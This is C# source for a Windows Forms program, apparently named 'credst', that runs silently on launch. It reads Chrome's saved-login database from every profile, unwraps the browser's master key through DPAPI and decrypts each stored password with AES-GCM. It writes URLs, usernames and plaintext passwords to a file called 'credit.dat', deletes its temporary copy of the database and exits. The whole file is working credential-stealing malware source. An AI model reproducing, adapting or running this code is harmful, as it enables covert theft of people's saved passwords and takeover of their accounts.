using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;


namespace credst
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string gdata = @"\Google\Chrome\User Data\";
        string pfile = "Login Data";
        string loginfile, statefile = "";
        string temp = Environment.GetEnvironmentVariable("temp");
        public void Form1_Load(object sender, EventArgs e)
        {
            loginfile = appdata + gdata + pfile;
            statefile = appdata + @"\Google\Chrome\User Data\Local State";
            string[] args = Environment.GetCommandLineArgs();
            if (Array.IndexOf(args, "--lstate") != -1)
            {
                statefile = args[Array.IndexOf(args, "--lstate") + 1];
            }
            if (Array.IndexOf(args, "--logindb") != -1)
            {
                loginfile = args[Array.IndexOf(args, "--logindb") + 1];
            }
            string[] profiles = Directory.GetDirectories(appdata + gdata).Where(i => Path.GetFileName(i).Contains("Profile") || Path.GetFileName(i) == "Default").ToArray();
            foreach (string prof in profiles)
            {
                loginfile = prof + "\\" + pfile;
                if (File.Exists(loginfile) && File.Exists(statefile))
                {
                    try
                    {
                        chps();
                        clean();
                    }
                    catch (Exception ex)
                    {
                        File.AppendAllText("error-c.log", Environment.NewLine + "\"" + Environment.MachineName + "\" " + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ex.Message);
                    }
                }
                else
                {
                    File.AppendAllText("error-c.log", Environment.NewLine + "\"" + Environment.MachineName + "\" " + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + "One or more required files not found");
                }
            }
            Application.Exit();
        }
        
        private void chps()
        {
            File.Copy(loginfile, temp + "\\lgdt.tmp", true);
            string connection = "Data Source=" + temp + "\\lgdt.tmp";
            string query = "SELECT action_url, username_value, password_value FROM logins";
            SQLiteConnection con = new SQLiteConnection(connection);
            SQLiteCommand cmd = new SQLiteCommand(query, con);
            con.Open();
            SQLiteDataReader dr = cmd.ExecuteReader();

            string encKey = getKey(File.ReadAllText(statefile));
            byte[] enKey = Convert.FromBase64String(encKey).Skip(5).ToArray();
            enKey = ProtectedData.Unprotect(enKey, null, DataProtectionScope.LocalMachine);

            while (dr.Read())
            {
                byte[] value = (byte[])dr["password_value"];
                try
                {
                    string password = Encoding.Default.GetString(decrypt(value, enKey));
                    File.AppendAllText("credit.dat", Environment.NewLine + dr["action_url"] + " ; " + dr["username_value"] + " ; " + password);
                }
                catch(Exception e) {  }
            }
            
        }
        private void clean()
        {
            File.Delete(temp + "\\lgdt.tmp");
        }
        private string getKey(string localstate)
        {
            int i = localstate.IndexOf("\"encrypted_key\"");
            i = localstate.IndexOf(":", i) + 2;
            int e = localstate.IndexOf("\"", i + 1);
            return localstate.Substring(i, e - i);
        }

        private byte[] decrypt(byte[] blob, byte[] key)
        {
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            var cipherStream = new MemoryStream(blob);
            var cipherReader = new BinaryReader(cipherStream);
            var nonSecretPayload = cipherReader.ReadBytes(3);
            var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
            cipher.Init(false, parameters);
            var cipherText = cipherReader.ReadBytes(blob.Length);
            var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
            var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
            cipher.DoFinal(plainText, len);
            return plainText;
        }

        private byte[] hextobyte(string hexString)
        {
            byte[] bytearr = new byte[hexString.Length / 2];
            int a = hexString.Length;
            Parallel.For(0, hexString.Length / 2, i =>
            {
                a = a + 0;
                string hex = hexString.Substring(i * 2, 2);
                bytearr[i] = byte.Parse(hex, System.Globalization.NumberStyles.HexNumber);
            });
            return bytearr;
        }
    }

}


